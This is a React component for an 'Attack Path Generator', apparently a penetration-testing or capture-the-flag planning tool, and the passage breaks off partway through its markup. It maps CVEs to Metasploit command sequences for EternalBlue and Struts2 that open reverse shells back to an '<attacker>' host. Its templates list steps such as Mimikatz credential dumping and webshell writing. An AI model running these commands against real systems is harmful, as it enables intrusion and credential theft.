// AttackPathGenerator.tsx
import { useState, useEffect, useRef, useCallback, useMemo } from 'react'
import { 
  GitBranch, Plus, Trash2, Download, History,
  Layers, Play, Target, 
  Zap, Server,
  Copy, Check, AlertTriangle, 
  Star, Clock, Search
} from 'lucide-react'

// Types
interface Service {
  port: string;
  protocol: string;
  state: string;
  service: string;
  version: string;
}

interface Vulnerability {
  id: string;
  name: string;
  cve?: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  exploitAvailable: boolean;
  exploitComplexity: 'Low' | 'Medium' | 'High';
}

interface AttackNode {
  id: string;
  type: 'target' | 'recon' | 'enum' | 'vuln' | 'exploit' | 'privesc' | 'post' | 'flag';
  label: string;
  detail: string;
  services?: Service[];
  vulnerabilities?: Vulnerability[];
  commands?: string[];
  tools?: string[];
  timestamp: string;
  notes?: string;
}

interface AttackPath {
  id: string;
  name: string;
  nodes: AttackNode[];
  edges: { source: string; target: string; label: string }[];
  createdAt: string;
  updatedAt: string;
  completed: boolean;
  notes?: string;
  favorite?: boolean;
  tags?: string[];
}

interface ScanResult {
  services: Service[];
  vulnerabilities: Vulnerability[];
  target: string;
  scanTime: string;
}

// ─── CONSTANTS ───
const NODE_COLORS: Record<string, string> = {
  target: 'border-ghost-blue',
  recon: 'border-ghost-cyan',
  enum: 'border-ghost-green',
  vuln: 'border-ghost-red',
  exploit: 'border-ghost-purple',
  privesc: 'border-ghost-yellow',
  post: 'border-ghost-orange',
  flag: 'border-ghost-green'
}

const NODE_ICONS: Record<string, string> = {
  target: '🎯',
  recon: '🔭',
  enum: '🔍',
  vuln: '💥',
  exploit: '⚡',
  privesc: '👑',
  post: '📝',
  flag: '🏴'
}

const NODE_BGS: Record<string, string> = {
  target: 'bg-ghost-blue/10',
  recon: 'bg-ghost-cyan/10',
  enum: 'bg-ghost-green/10',
  vuln: 'bg-ghost-red/10',
  exploit: 'bg-ghost-purple/10',
  privesc: 'bg-ghost-yellow/10',
  post: 'bg-ghost-orange/10',
  flag: 'bg-ghost-green/10'
}

const NODE_TEXTS: Record<string, string> = {
  target: 'text-ghost-blue',
  recon: 'text-ghost-cyan',
  enum: 'text-ghost-green',
  vuln: 'text-ghost-red',
  exploit: 'text-ghost-purple',
  privesc: 'text-ghost-yellow',
  post: 'text-ghost-orange',
  flag: 'text-ghost-green'
}

// Default scan results for demo
const DEFAULT_SCAN: ScanResult = {
  target: '192.168.1.100',
  scanTime: new Date().toISOString(),
  services: [
    { port: '22', protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 7.4' },
    { port: '80', protocol: 'tcp', state: 'open', service: 'http', version: 'Apache 2.4.6' },
    { port: '445', protocol: 'tcp', state: 'open', service: 'smb', version: 'Samba 4.7.6' },
    { port: '3306', protocol: 'tcp', state: 'open', service: 'mysql', version: 'MySQL 5.6.49' },
    { port: '8080', protocol: 'tcp', state: 'open', service: 'http-proxy', version: 'Squid 3.5.20' },
  ],
  vulnerabilities: [
    { id: '1', name: 'SMB EternalBlue', cve: 'CVE-2017-0144', severity: 'critical', description: 'SMBv1 remote code execution vulnerability', exploitAvailable: true, exploitComplexity: 'Low' },
    { id: '2', name: 'Apache Struts RCE', cve: 'CVE-2017-5638', severity: 'critical', description: 'Apache Struts remote code execution', exploitAvailable: true, exploitComplexity: 'Medium' },
    { id: '3', name: 'MySQL Weak Credentials', cve: '', severity: 'high', description: 'Default/weak MySQL credentials', exploitAvailable: true, exploitComplexity: 'Low' },
    { id: '4', name: 'SMB Null Session', cve: '', severity: 'medium', description: 'SMB null session enumeration', exploitAvailable: true, exploitComplexity: 'Low' },
  ]
}

// Vulnerability to exploit mapping
const VULN_TO_EXPLOIT: Record<string, { tool: string; command: string; description: string }> = {
  'CVE-2017-0144': {
    tool: 'Metasploit',
    command: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <attacker>\nrun',
    description: 'EternalBlue exploit for SMBv1'
  },
  'CVE-2017-5638': {
    tool: 'Metasploit',
    command: 'use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS <target>\nset TARGETURI /struts2-showcase/\nset PAYLOAD linux/x86/shell_reverse_tcp\nset LHOST <attacker>\nrun',
    description: 'Apache Struts2 OGNL injection'
  },
}

// Attack path templates
const ATTACK_TEMPLATES = {
  'SMB Exploitation': {
    description: 'Classic SMB-to-System attack path',
    icon: '🪟',
    color: 'bg-cyan-900/30 border-cyan-500/30',
    nodes: [
      { type: 'recon', label: 'Nmap Scan', detail: 'Discovered SMB on port 445' },
      { type: 'enum', label: 'SMB Enumeration', detail: 'Found SMB vulnerabilities' },
      { type: 'vuln', label: 'EternalBlue Vulnerability', detail: 'CVE-2017-0144' },
      { type: 'exploit', label: 'Metasploit Exploit', detail: 'MS17-010 EternalBlue' },
      { type: 'privesc', label: 'SYSTEM Shell', detail: 'Got SYSTEM privileges' },
      { type: 'post', label: 'Mimikatz', detail: 'Dump credentials' },
      { type: 'flag', label: 'ROOT/ADMIN Flag', detail: 'Complete compromise' },
    ]
  },
  'Web Application Attack': {
    description: 'HTTP to shell attack path',
    icon: '🌐',
    color: 'bg-orange-900/30 border-orange-500/30',
    nodes: [
      { type: 'recon', label: 'Web Recon', detail: 'Discovered Apache Struts' },
      { type: 'enum', label: 'Directory Enumeration', detail: 'Found /struts2-showcase/' },
      { type: 'vuln', label: 'Struts2 RCE', detail: 'CVE-2017-5638' },
      { type: 'exploit', label: 'OGNL Injection', detail: 'Remote code execution' },
      { type: 'privesc', label: 'www-data Shell', detail: 'Low privilege shell' },
      { type: 'post', label: 'Sudo -l', detail: 'Found sudo permissions' },
      { type: 'flag', label: 'Root Flag', detail: 'Complete compromise' },
    ]
  },
  'MySQL Exploitation': {
    description: 'Database to shell attack path',
    icon: '🗄️',
    color: 'bg-green-900/30 border-green-500/30',
    nodes: [
      { type: 'recon', label: 'Port Scan', detail: 'Found MySQL on 3306' },
      { type: 'enum', label: 'MySQL Enumeration', detail: 'Found default credentials' },
      { type: 'vuln', label: 'Weak Credentials', detail: 'root:root' },
      { type: 'exploit', label: 'MySQL Login', detail: 'Logged in as root' },
      { type: 'privesc', label: 'UDF Exploit', detail: 'Command execution via UDF' },
      { type: 'post', label: 'File Write', detail: 'Write webshell' },
      { type: 'flag', label: 'System Compromise', detail: 'Complete compromise' },
    ]
  },
  'Linux Privilege Escalation': {
    description: 'Standard Linux privesc path',
    icon: '🐧',
    color: 'bg-purple-900/30 border-purple-500/30',
    nodes: [
      { type: 'recon', label: 'User Enumeration', detail: 'Found current user and groups' },
      { type: 'enum', label: 'SUID Scan', detail: 'Found SUID binaries' },
      { type: 'vuln', label: 'SUID Vulnerability', detail: 'Exploitable SUID binary' },
      { type: 'exploit', label: 'SUID Exploitation', detail: 'Execute with SUID privilege' },
      { type: 'privesc', label: 'Root Shell', detail: 'Got root access' },
      { type: 'flag', label: 'Root Flag', detail: 'Complete compromise' },
    ]
  }
}

type TemplateKey = keyof typeof ATTACK_TEMPLATES;

// ─── HELPER COMPONENTS ───

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  
  const handleCopy = useCallback(async () => {
    const fallback = () => {
      try {
        const el = document.createElement('textarea')
        el.value = text
        el.style.position = 'fixed'
        el.style.opacity = '0'
        document.body.appendChild(el)
        el.select()
        document.execCommand('copy')
        document.body.removeChild(el)
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch {
        console.debug('Copy fallback failed')
      }
    }

    if (navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(text)
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch {
        fallback()
      }
    } else {
      fallback()
    }
  }, [text])

  return (
    <button
      onClick={handleCopy}
      className="flex items-center gap-1 text-xs text-gray-400 hover:text-ghost-green transition-colors"
      aria-label={copied ? "Copied" : "Copy to clipboard"}
    >
      {copied ? <><Check size={10} className="text-ghost-green" />copied</> : <><Copy size={10} />copy</>}
    </button>
  )
}

// ─── HELPERS ───

function getNodeColor(type: string): string {
  return NODE_COLORS[type] || 'border-gray-600'
}

function getNodeIcon(type: string): string {
  return NODE_ICONS[type] || '●'
}

function getNodeBg(type: string): string {
  return NODE_BGS[type] || 'bg-gray-700'
}

function getNodeTextColor(type: string): string {
  return NODE_TEXTS[type] || 'text-gray-300'
}

function nextId(prefix: string): string {
  return `${prefix}-${crypto.randomUUID ? crypto.randomUUID().slice(0, 8) : Date.now().toString(36)}`
}

// ─── MAIN COMPONENT ───

export default function AttackPathGenerator() {
  // State
  const [scanResult, setScanResult] = useState<ScanResult>(DEFAULT_SCAN)
  const [attackPaths, setAttackPaths] = useState<AttackPath[]>([])
  const [selectedPath, setSelectedPath] = useState<AttackPath | null>(null)
  const [activeTab, setActiveTab] = useState<'generator' | 'paths' | 'templates'>('generator')
  const [isGenerating, setIsGenerating] = useState(false)
  const [expandedNodes, setExpandedNodes] = useState<Set<number>>(new Set())
  const [searchTerm, setSearchTerm] = useState('')
  const [showFavorites, setShowFavorites] = useState(false)
  const [filterStatus, setFilterStatus] = useState<'all' | 'completed' | 'inprogress'>('all')
  const [pathName, setPathName] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [errorTimeout, setErrorTimeout] = useState<ReturnType<typeof setTimeout> | null>(null)

  const scrollRef = useRef<HTMLDivElement>(null)
  const generateTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  // ─── ERROR HANDLING ───
  const showError = useCallback((msg: string) => {
    if (errorTimeout) clearTimeout(errorTimeout)
    setError(msg)
    const timeout = setTimeout(() => setError(null), 5000)
    setErrorTimeout(timeout)
  }, [errorTimeout])

  // ─── PERSIST ───
  useEffect(() => {
    try {
      const saved = localStorage.getItem('attackPaths')
      if (saved) {
        const parsed = JSON.parse(saved)
        if (Array.isArray(parsed)) {
          setAttackPaths(parsed)
        }
      }
    } catch (error) {
      console.error('Failed to load saved paths:', error)
      showError('Failed to load saved paths from storage')
    }
  }, [showError])

  useEffect(() => {
    try {
      localStorage.setItem('attackPaths', JSON.stringify(attackPaths))
      // Clear any previous error on successful save
      if (error) setError(null)
    } catch (error) {
      console.error('Failed to save paths:', error)
      showError('Failed to save paths to storage')
    }
  }, [attackPaths, showError, error])

  // ─── CLEANUP ───
  useEffect(() => {
    return () => {
      if (generateTimeoutRef.current) {
        clearTimeout(generateTimeoutRef.current)
      }
      if (errorTimeout) {
        clearTimeout(errorTimeout)
      }
    }
  }, [errorTimeout])

  // ─── GENERATE ATTACK PATH ───
  const generateAttackPath = useCallback(() => {
    if (scanResult.services.length === 0) {
      showError('No services found to generate attack path')
      return
    }

    if (generateTimeoutRef.current) {
      clearTimeout(generateTimeoutRef.current)
    }

    setIsGenerating(true)
    setError(null)
    
    generateTimeoutRef.current = setTimeout(() => {
      generateTimeoutRef.current = null
      try {
        const nodes: AttackNode[] = []
        const edges: { source: string; target: string; label: string }[] = []
        const now = new Date().toISOString()
        
        // 1. Target node
        nodes.push({
          id: nextId('target'),
          type: 'target',
          label: scanResult.target || 'Unknown Target',
          detail: 'Target system',
          services: scanResult.services,
          timestamp: now
        })
        
        // 2. Recon/Enumeration nodes
        nodes.push({
          id: nextId('recon'),
          type: 'recon',
          label: 'Reconnaissance',
          detail: `Found ${scanResult.services.length} open ports`,
          services: scanResult.services,
          timestamp: now
        })
        edges.push({ source: nodes[0].id, target: nodes[1].id, label: 'scan' })
        
        // 3. Vulnerability nodes
        const vulnNodes: AttackNode[] = scanResult.vulnerabilities
          .filter(v => v.name.trim() !== '')
          .map((v, i) => ({
            id: nextId(`vuln-${i}`),
            type: 'vuln',
            label: v.name || 'Unknown Vulnerability',
            detail: v.cve ? `${v.cve} - ${v.description}` : v.description,
            vulnerabilities: [v],
            timestamp: now
          }))
        
        vulnNodes.forEach((node) => {
          nodes.push(node)
          edges.push({ source: nodes[1].id, target: node.id, label: 'discovered' })
        })
        
        // 4. Exploit nodes
        const exploitNodes: AttackNode[] = scanResult.vulnerabilities
          .filter(v => v.exploitAvailable && v.name.trim() !== '')
          .map((v, i) => {
            const exploit = VULN_TO_EXPLOIT[v.cve || ''] || {
              tool: 'Searchsploit',
              command: `searchsploit ${v.name}`,
              description: `Exploit for ${v.name}`
            }
            return {
              id: nextId(`exploit-${i}`),
              type: 'exploit',
              label: `Exploit: ${v.name}`,
              detail: exploit.description,
              commands: [exploit.command],
              tools: [exploit.tool],
              timestamp: now
            }
          })
        
        exploitNodes.forEach((node, i) => {
          nodes.push(node)
          const vulnIndex = vulnNodes.length > i ? i : 0
          edges.push({ 
            source: vulnNodes[vulnIndex]?.id || nodes[1].id, 
            target: node.id, 
            label: 'exploit' 
          })
        })
        
        // 5. Privesc nodes
        const privescNodes: AttackNode[] = exploitNodes.length > 0 ? [
          {
            id: nextId('privesc'),
            type: 'privesc',
            label: 'Privilege Escalation',
            detail: 'Escalate to SYSTEM/root',
            tools: ['linpeas', 'winpeas', 'pspy'],
            commands: ['linpeas.sh', 'winpeas.exe', './pspy64'],
            timestamp: now
          }
        ] : []
        
        privescNodes.forEach(node => {
          nodes.push(node)
          if (exploitNodes.length > 0) {
            edges.push({ 
              source: exploitNodes[0].id, 
              target: node.id, 
              label: 'privesc' 
            })
          }
        })
        
        // 6. Flag node
        const flagNode: AttackNode = {
          id: nextId('flag'),
          type: 'flag',
          label: '🏴 Flag Captured',
          detail: 'Full compromise achieved!',
          timestamp: now
        }
        nodes.push(flagNode)
        
        // Connect to flag from privesc or last exploit
        if (privescNodes.length > 0) {
          edges.push({ source: privescNodes[0].id, target: flagNode.id, label: 'win' })
        } else if (exploitNodes.length > 0) {
          edges.push({ source: exploitNodes[0].id, target: flagNode.id, label: 'win' })
        } else if (nodes.length > 1) {
          edges.push({ source: nodes[nodes.length - 2].id, target: flagNode.id, label: 'win' })
        }
        
        const name = pathName.trim() || `Attack Path: ${scanResult.target} - ${new Date().toLocaleDateString()}`
        const newPath: AttackPath = {
          id: crypto.randomUUID ? crypto.randomUUID() : `path-${Date.now()}`,
          name: name,
          nodes: nodes,
          edges: edges,
          createdAt: now,
          updatedAt: now,
          completed: false,
          favorite: false,
          tags: []
        }
        
        setSelectedPath(newPath)
        setAttackPaths(prev => [newPath, ...prev])
        setPathName('')
        
        // Auto-expand all nodes
        setExpandedNodes(new Set(nodes.map((_, i) => i)))
        
        // Scroll to visualization
        scrollRef.current?.scrollIntoView({ behavior: 'smooth' })
      } catch (error) {
        console.error('Failed to generate attack path:', error)
        showError('Failed to generate attack path')
      } finally {
        setIsGenerating(false)
      }
    }, 1500)
  }, [scanResult, pathName, showError])

  // ─── GENERATE FROM TEMPLATE ───
  const generateFromTemplate = useCallback((templateName: string) => {
    if (generateTimeoutRef.current) {
      clearTimeout(generateTimeoutRef.current)
    }

    setIsGenerating(true)
    setError(null)
    
    generateTimeoutRef.current = setTimeout(() => {
      generateTimeoutRef.current = null
      try {
        const template = ATTACK_TEMPLATES[templateName as TemplateKey]
        if (!template) {
          showError(`Template "${templateName}" not found`)
          setIsGenerating(false)
          return
        }
        
        const now = new Date().toISOString()
        const nodes: AttackNode[] = template.nodes.map((n, i) => ({
          id: nextId(`${templateName}-${i}`),
          type: n.type as AttackNode['type'],
          label: n.label,
          detail: n.detail,
          timestamp: now
        }))
        
        const edges: { source: string; target: string; label: string }[] = []
        for (let i = 0; i < nodes.length - 1; i++) {
          edges.push({
            source: nodes[i].id,
            target: nodes[i + 1].id,
            label: i === 0 ? 'start' : i === nodes.length - 2 ? 'win' : 'next'
          })
        }
        
        const name = pathName.trim() || `${templateName} Path - ${new Date().toLocaleDateString()}`
        const newPath: AttackPath = {
          id: crypto.randomUUID ? crypto.randomUUID() : `path-${Date.now()}`,
          name: name,
          nodes: nodes,
          edges: edges,
          createdAt: now,
          updatedAt: now,
          completed: false,
          favorite: false,
          tags: []
        }
        
        setSelectedPath(newPath)
        setAttackPaths(prev => [newPath, ...prev])
        setPathName('')
        setExpandedNodes(new Set(nodes.map((_, i) => i)))
        
        scrollRef.current?.scrollIntoView({ behavior: 'smooth' })
      } catch (error) {
        console.error('Failed to generate from template:', error)
        showError('Failed to generate from template')
      } finally {
        setIsGenerating(false)
      }
    }, 1000)
  }, [pathName, showError])

  // ─── CRUD OPERATIONS ───
  const loadPath = useCallback((path: AttackPath) => {
    setSelectedPath(path)
    setActiveTab('generator')
    setExpandedNodes(new Set(path.nodes.map((_, i) => i)))
    setTimeout(() => scrollRef.current?.scrollIntoView({ behavior: 'smooth' }), 100)
  }, [])

  const deletePath = useCallback((id: string) => {
    if (!confirm(`Delete "${attackPaths.find(p => p.id === id)?.name || 'path'}"?`)) return
    setAttackPaths(prev => prev.filter(p => p.id !== id))
    if (selectedPath?.id === id) {
      setSelectedPath(null)
    }
  }, [selectedPath, attackPaths])

  const clearAllPaths = useCallback(() => {
    if (attackPaths.length === 0) return
    if (!confirm(`Delete all ${attackPaths.length} saved attack paths? This cannot be undone.`)) return
    setAttackPaths([])
    setSelectedPath(null)
  }, [attackPaths.length])

  const toggleFavorite = useCallback((id: string) => {
    setAttackPaths(prev => prev.map(p => 
      p.id === id ? { ...p, favorite: !p.favorite } : p
    ))
    if (selectedPath?.id === id) {
      setSelectedPath(prev => prev ? { ...prev, favorite: !prev.favorite } : null)
    }
  }, [selectedPath])

  const exportPath = useCallback(() => {
    if (!selectedPath) {
      showError('No path selected to export')
      return
    }
    
    try {
      // Minify JSON for export
      const data = JSON.stringify(selectedPath)
      const blob = new Blob([data], { type: 'application/json' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `attack-path-${selectedPath.name.slice(0, 30).replace(/[^a-zA-Z0-9]/g, '_')}.json`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
    } catch (error) {
      console.error('Failed to export path:', error)
      showError('Failed to export path')
    }
  }, [selectedPath, showError])

  const exportAllPaths = useCallback(() => {
    if (attackPaths.length === 0) {
      showError('No paths to export')
      return
    }
    
    try {
      // Minify JSON for export
      const data = JSON.stringify(attackPaths)
      const blob = new Blob([data], { type: 'application/json' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `attack-paths-${new Date().toISOString().slice(0,10)}.json`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
    } catch (error) {
      console.error('Failed to export all paths:', error)
      showError('Failed to export all paths')
    }
  }, [attackPaths, showError])

  const toggleNode = useCallback((index: number) => {
    setExpandedNodes(prev => {
      const next = new Set(prev)
      next.has(index) ? next.delete(index) : next.add(index)
      return next
    })
  }, [])

  // ─── SERVICE / VULN CRUD ───
  const addService = useCallback(() => {
    setScanResult(prev => ({ 
      ...prev, 
      services: [...prev.services, { port: '', protocol: 'tcp', state: 'open', service: '', version: '' }] 
    }))
  }, [])

  const updateService = useCallback((idx: number, field: keyof Service, value: string) => {
    setScanResult(prev => ({
      ...prev,
      services: prev.services.map((s, i) => i === idx ? { ...s, [field]: value } : s)
    }))
  }, [])

  const removeService = useCallback((idx: number) => {
    setScanResult(prev => ({ 
      ...prev, 
      services: prev.services.filter((_, i) => i !== idx) 
    }))
  }, [])

  const addVulnerability = useCallback(() => {
    setScanResult(prev => ({ 
      ...prev, 
      vulnerabilities: [...prev.vulnerabilities, { 
        id: crypto.randomUUID ? crypto.randomUUID() : `vuln-${Date.now()}`,
        name: '', 
        cve: '', 
        severity: 'medium' as const, 
        description: '', 
        exploitAvailable: false, 
        exploitComplexity: 'Medium' as const 
      }] 
    }))
  }, [])

  const updateVulnerability = useCallback((idx: number, field: keyof Vulnerability, value: string | boolean | 'critical' | 'high' | 'medium' | 'low' | 'Low' | 'Medium' | 'High') => {
    setScanResult(prev => ({
      ...prev,
      vulnerabilities: prev.vulnerabilities.map((v, i) => i === idx ? { ...v, [field]: value } : v)
    }))
  }, [])

  const removeVulnerability = useCallback((idx: number) => {
    setScanResult(prev => ({ 
      ...prev, 
      vulnerabilities: prev.vulnerabilities.filter((_, i) => i !== idx) 
    }))
  }, [])

  // ─── FILTERED PATHS ───
  const filteredPaths = useMemo(() => {
    return attackPaths
      .filter(p => {
        if (showFavorites && !p.favorite) return false
        if (filterStatus === 'completed' && !p.completed) return false
        if (filterStatus === 'inprogress' && p.completed) return false
        if (searchTerm.trim()) {
          const search = searchTerm.toLowerCase().trim()
          return p.name.toLowerCase().includes(search) ||
                 p.nodes.some(n => n.label.toLowerCase().includes(search))
        }
        return true
      })
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
  }, [attackPaths, showFavorites, filterStatus, searchTerm])

  // ─── STATS ───
  const stats = useMemo(() => {
    const totalPaths = attackPaths.length
    const completedPaths = attackPaths.filter(p => p.completed).length
    const favoritePaths = attackPaths.filter(p => p.favorite).length
    const totalNodes = attackPaths.reduce((sum, p) => sum + p.nodes.length, 0)
    return { totalPaths, completedPaths, favoritePaths, totalNodes }
  }, [attackPaths])

  // ─── RENDER ───
  return (
    <div className="min-h-screen bg-ghost-bg text-ghost-text p-6">
      <div className="max-w-7xl mx-auto">
        
        {/* Header */}
        <div className="flex items-center justify-between mb-6 flex-wrap gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl flex items-center justify-center bg-ghost-purple/20 border border-ghost-purple/30">
              <GitBranch className="text-ghost-purple" size={20} />
            </div>
            <div>
              <h1 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-cyan-400 bg-clip-text text-transparent">
                Attack Path Generator
              </h1>
              <p className="text-ghost-text-dim text-sm">Automatically discover and visualize attack chains</p>
            </div>
          </div>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={() => setActiveTab('paths')}
              className={`px-3 py-1.5 text-sm font-mono rounded border transition-colors ${
                activeTab === 'paths' 
                  ? 'bg-ghost-purple/20 border-ghost-purple/50 text-ghost-purple' 
                  : 'border-ghost-border text-ghost-text-dim hover:text-ghost-text'
              }`}
              aria-label="View saved paths"
            >
              <History size={14} className="inline mr-1" />
              Saved Paths ({attackPaths.length})
            </button>
            <button
              onClick={() => setActiveTab('templates')}
              className={`px-3 py-1.5 text-sm font-mono rounded border transition-colors ${
                activeTab === 'templates' 
                  ? 'bg-ghost-cyan/20 border-ghost-cyan/50 text-ghost-cyan' 
                  : 'border-ghost-border text-ghost-text-dim hover:text-ghost-text'
              }`}
              aria-label="View templates"
            >
              <Layers size={14} className="inline mr-1" />
              Templates
            </button>
          </div>
        </div>

        {/* Error Display */}
        {error && (
          <div className="mb-4 p-3 bg-ghost-red/10 border border-ghost-red/30 rounded-lg text-ghost-red text-sm flex items-center gap-2">
            <AlertTriangle size={16} />
            {error}
            <button 
              onClick={() => setError(null)} 
              className="ml-auto text-ghost-text-dim hover:text-ghost-text"
              aria-label="Dismiss error"
            >
              ✕
            </button>
          </div>
        )}

        {/* Stats Bar */}
        {attackPaths.length > 0 && (
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6 text-xs font-mono">
            <div className="bg-ghost-surface border border-ghost-border rounded-lg p-3 text-center">
              <div className="text-ghost-text-dim">Total Paths</div>
              <div className="text-ghost-purple font-bold">{stats.totalPaths}</div>
            </div>
            <div className="bg-ghost-surface border border-ghost-green/30 rounded-lg p-3 text-center">
              <div className="text-ghost-text-dim">Completed</div>
              <div className="text-ghost-green font-bold">{stats.completedPaths}</div>
            </div>
            <div className="bg-ghost-surface border border-yellow-400/30 rounded-lg p-3 text-center">
              <div className="text-ghost-text-dim">Favorites</div>
              <div className="text-yellow-400 font-bold">{stats.favoritePaths}</div>
            </div>
            <div className="bg-ghost-surface border border-ghost-cyan/30 rounded-lg p-3 text-center">
              <div className="text-ghost-text-dim">Total Nodes</div>
              <div className="text-ghost-cyan font-bold">{stats.totalNodes}</div>
            </div>
          </div>
        )}

        {/* Tabs */}
        <div className="flex gap-2 mb-6 border-b border-ghost-border pb-2 flex-wrap" role="tablist">
          <button
            role="tab"
            aria-selected={activeTab === 'generator'}
            onClick={() => setActiveTab('generator')}
            className={`px-4 py-2 text-sm font-mono rounded-t transition-colors ${
              activeTab === 'generator' 
                ? 'bg-ghost-surface text-ghost-purple border-t border-l border-r border-ghost-border' 
                : 'text-ghost-text-dim hover:text-ghost-text'
            }`}
          >
            ⚡ Generator
          </button>
          <button
            role="tab"
            aria-selected={activeTab === 'paths'}
            onClick={() => setActiveTab('paths')}
            className={`px-4 py-2 text-sm font-mono rounded-t transition-colors ${
              activeTab === 'paths' 
                ? 'bg-ghost-surface text-ghost-purple border-t border-l border-r border-ghost-border' 
                : 'text-ghost-text-dim hover:text-ghost-text'
            }`}
          >
            📋 Saved Paths ({attackPaths.length})
          </button>
          <button
            role="tab"
            aria-selected={activeTab === 'templates'}
            onClick={() => setActiveTab('templates')}
            className={`px-4 py-2 text-sm font-mono rounded-t transition-colors ${
              activeTab === 'templates' 
                ? 'bg-ghost-surface text-ghost-cyan border-t border-l border-r border-ghost-border' 
                : 'text-ghost-text-dim hover:text-ghost-text'
            }`}
          >
            📚 Templates
          </button>
        </div>

        {/* Generator Tab */}
        {activeTab === 'generator' && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Input Panel */}
            <div className="lg:col-span-1 space-y-4">
              {/* Path Name */}
              <div className="ghost-panel p-4 rounded-xl border border-ghost-border bg-ghost-surface/50">
                <label htmlFor="pathName" className="block text-xs text-ghost-text-dim mb-1 font-mono">
                  Path Name
                </label>
                <input
                  id="pathName"
                  type="text"
                  value={pathName}
                  onChange={(e) => setPathName(e.target.value)}
                  placeholder="Enter a name for this path..."
                  className="w-full bg-ghost-bg border border-ghost-border rounded-lg px-3 py-2 text-sm text-ghost-text focus:outline-none focus:ring-2 focus:ring-ghost-purple placeholder-ghost-text-dim"
                  onKeyDown={(e) => e.key === 'Enter' && generateAttackPath()}
                />
              </div>

              <div className="ghost-panel p-4 rounded-xl border border-ghost-border bg-ghost-surface/50">
                <h2 className="text-sm font-bold text-ghost-cyan mb-3 flex items-center gap-2">
                  <Target size={16} />
                  Target Information
                </h2>
                
                <div className="space-y-3">
                  <div>
                    <label htmlFor="targetInput" className="block text-xs text-ghost-text-dim mb-1 font-mono">
                      Target IP/Hostname
                    </label>
                    <input
                      id="targetInput"
                      type="text"
                      value={scanResult.target}
                      onChange={(e) => setScanResult(prev => ({ ...prev, target: e.target.value }))}
                      className="w-full bg-ghost-bg border border-ghost-border rounded-lg px-3 py-2 text-sm text-ghost-text focus:outline-none focus:ring-2 focus:ring-ghost-purple placeholder-ghost-text-dim"
                      placeholder="192.168.1.100"
                    />
                  </div>
                  
                  <div>
                    <label htmlFor="scanTimeInput" className="block text-xs text-ghost-text-dim mb-1 font-mono">
                      Scan Time
                    </label>
                    <input
                      id="scanTimeInput"
                      type="datetime-local"
                      value={new Date(scanResult.scanTime).toISOString().slice(0, 16)}
                      onChange={(e) => setScanResult(prev => ({ ...prev, scanTime: new Date(e.target.value).toISOString() }))}
                      className="w-full bg-ghost-bg border border-ghost-border rounded-lg px-3 py-2 text-sm text-ghost-text focus:outline-none focus:ring-2 focus:ring-ghost-purple"
                    />
                  </div>
                </div>
              </div>

              {/* Services */}
              <div className="ghost-panel p-4 rounded-xl border border-ghost-border bg-ghost-surface/50">
                <div className="flex items-center justify-between mb-3">
                  <h2 className="text-sm font-bold text-ghost-cyan flex items-center gap-2">
                    <Server size={16} />
                    Services ({scanResult.services.length})
                  </h2>
                  <button
                    onClick={addService}
                    className="text-xs text-ghost-purple hover:text-ghost-purple/80 transition-colors"
                    aria-label="Add service"
                  >
                    <Plus size={14} />
                  </button>
                </div>
                
                <div className="space-y-2 max-h-48 overflow-y-auto custom-scrollbar">
                  {scanResult.services.map((svc, idx) => (
                    <div key={idx} className="bg-ghost-bg/50 rounded-lg p-2 text-xs border border-ghost-border">
                      <div className="flex items-center gap-2">
                        <input
                          value={svc.port}
                          onChange={(e) => updateService(idx, 'port', e.target.value)}
                          placeholder="Port"
                          className="w-16 bg-ghost-surface border border-ghost-border rounded px-1 py-0.5 text-ghost-text text-xs focus:outline-none focus:ring-1 focus:ring-ghost-purple"
                          aria-label="Service port"
                        />
                        <input
                          value={svc.service}
                          onChange={(e) => updateService(idx, 'service', e.target.value)}
                          placeholder="Service"
                          className="flex-1 bg-ghost-surface border border-ghost-border rounded px-1 py-0.5 text-ghost-text text-xs focus:outline-none focus:ring-1 focus:ring-ghost-purple"
                          aria-label="Service name"
                        />
                        <button
                          onClick={() => removeService(idx)}
                          className="text-ghost-red hover:text-ghost-red/80 transition-colors"
                          aria-label="Remove service"
                        >
                          <Trash2 size={12} />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Vulnerabilities */}
              <div className="ghost-panel p-4 rounded-xl border border-ghost-border bg-ghost-surface/50">
                <div className="flex items-center justify-between mb-3">
                  <h2 className="text-sm font-bold text-ghost-red flex items-center gap-2">
                    <AlertTriangle size={16} />
                    Vulnerabilities ({scanResult.vulnerabilities.length})
                  </h2>
                  <button
                    onClick={addVulnerability}
                    className="text-xs text-ghost-purple hover:text-ghost-purple/80 transition-colors"
                    aria-label="Add vulnerability"
                  >
                    <Plus size={14} />
                  </button>
                </div>
                
                <div className="space-y-2 max-h-48 overflow-y-auto custom-scrollbar">
                  {scanResult.vulnerabilities.map((vuln, idx) => (
                    <div key={vuln.id || idx} className="bg-ghost-bg/50 rounded-lg p-2 text-xs border border-ghost-border">
                      <div className="flex items-center gap-2">
                        <input
                          value={vuln.name}
                          onChange={(e) => updateVulnerability(idx, 'name', e.target.value)}
                          placeholder="Vulnerability"
